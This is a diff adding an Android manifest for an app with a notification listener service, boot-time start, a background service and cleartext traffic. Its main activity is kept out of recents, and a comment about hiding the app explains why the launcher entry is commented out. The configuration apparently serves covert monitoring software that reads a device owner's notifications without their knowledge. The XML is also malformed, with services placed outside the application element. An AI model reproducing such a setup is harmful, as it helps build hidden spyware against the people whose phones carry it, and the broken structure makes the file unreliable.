@@ -1,0 +1,33 @@
+<manifest>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    
+    <service android:name=".service.NotificationListener"
+        android:label="@string/app_name"
+        android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+        android:exported="false">
+        <intent-filter>
+            <action android:name="android.service.notification.NotificationListenerService" />
+        </intent-filter>
+    </service>
+    
+    <service android:name=".service.BackgroundService"/>
+    
+    <activity
+        android:name=".MainActivity"
+        android:excludeFromRecents="true"
+        android:taskAffinity=""
+        android:launchMode="singleInstance"
+        >
+        <intent-filter>
+            <!-- Remove this to hide from launcher -->
+            <!-- <category android:name="android.intent.category.LAUNCHER" /> -->
+        </intent-filter>
+    </activity>
+    
+    <application
+        android:usesCleartextTraffic="true"
+        ... >
+    </application>
+</manifest> 
